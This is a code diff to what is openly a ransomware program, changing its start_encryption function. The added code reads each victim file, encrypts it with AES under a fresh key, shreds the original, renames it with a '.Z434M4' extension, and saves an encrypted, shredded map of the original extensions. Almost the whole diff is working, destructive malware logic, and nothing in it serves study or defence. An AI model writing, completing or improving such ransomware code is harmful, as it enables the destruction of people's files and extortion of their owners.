@@ -54,28 +54,86 @@ def encrypt_priv_key(msg, key):
 
 def start_encryption(files):
     AES_and_base64_path = []
+    extensions_map = {}  # Dictionary to store original extension mappings
+    extensions_file_path = os.path.join(variables.ransomware_path, "file_extensions.dat")
+    
+    # Create directory if it doesn't exist
+    os.makedirs(os.path.dirname(extensions_file_path), exist_ok=True)
+    
+    # Load existing extensions file if it exists
+    try:
+        if os.path.exists(extensions_file_path):
+            with open(extensions_file_path, 'rb') as ext_file:
+                extensions_map = pickle.load(ext_file)
+    except:
+        pass
+    
     for found_file in files:
         key = generate_keys.generate_key(128, True)
         AES_obj = symmetric.AESCipher(key)
         
-        found_file = base64.b64decode(found_file)
+        found_file_bytes = base64.b64decode(found_file)
+        found_file_str = found_file_bytes.decode('utf-8')
 
         try:
-            with open(found_file, 'rb') as f:
+            # Read file content
+            with open(found_file_bytes, 'rb') as f:
                 file_content = f.read()
-        except:
+                
+            # Get original file path, name and extension
+            file_path, file_name = os.path.split(found_file_str)
+            file_base, file_ext = os.path.splitext(file_name)
+            
+            # Encrypt the file
+            encrypted = AES_obj.encrypt(file_content)
+            
+            # Shred the original file
+            utils.shred(found_file_bytes)
+            
+            # Create new filename with malware extension (replacing original extension)
+            new_file_name = os.path.join(file_path, file_base + ".Z434M4")
+            
+            # Store the mapping between encrypted filename and original extension
+            extensions_map[new_file_name] = file_ext
+            
+            # Write encrypted file
+            with open(new_file_name, 'wb') as f:
+                f.write(encrypted)
+
+            # Add to the list for key storage
+            base64_new_file_name = base64.b64encode(new_file_name.encode('utf-8'))
+            AES_and_base64_path.append((key, base64_new_file_name))
+            
+        except Exception as e:
+            print(f"Error processing {found_file_str}: {str(e)}")
             continue
 
-        encrypted = AES_obj.encrypt(file_content)
-        utils.shred(found_file)
-
-        new_file_name = found_file.decode('utf-8') + ".Z434M4"  # Changed extension
-        with open(new_file_name, 'wb') as f:
-            f.write(encrypted)
-
-        base64_new_file_name = base64.b64encode(new_file_name.encode('utf-8'))
-
-        AES_and_base64_path.append((key, base64_new_file_name))
+    # Save the extensions map
+    with open(extensions_file_path, 'wb') as ext_file:
+        pickle.dump(extensions_map, ext_file)
+    
+    # Encrypt the extensions file for extra security
+    try:
+        with open(extensions_file_path, 'rb') as f:
+            ext_file_content = f.read()
+        
+        # Use a new key for extensions file
+        ext_key = generate_keys.generate_key(128, True)
+        AES_obj = symmetric.AESCipher(ext_key)
+        encrypted_ext = AES_obj.encrypt(ext_file_content)
+        
+        # Replace the plain file with encrypted version
+        with open(extensions_file_path + ".Z434M4", 'wb') as f:
+            f.write(encrypted_ext)
+            
+        # Remove original extensions file
+        utils.shred(extensions_file_path.encode('utf-8'))
+        
+        # Store the extensions file key for decryption
+        AES_and_base64_path.append((ext_key, base64.b64encode((extensions_file_path + ".Z434M4").encode('utf-8'))))
+    except Exception as e:
+        print(f"Error encrypting extensions file: {str(e)}")
+    
     return AES_and_base64_path
 
 
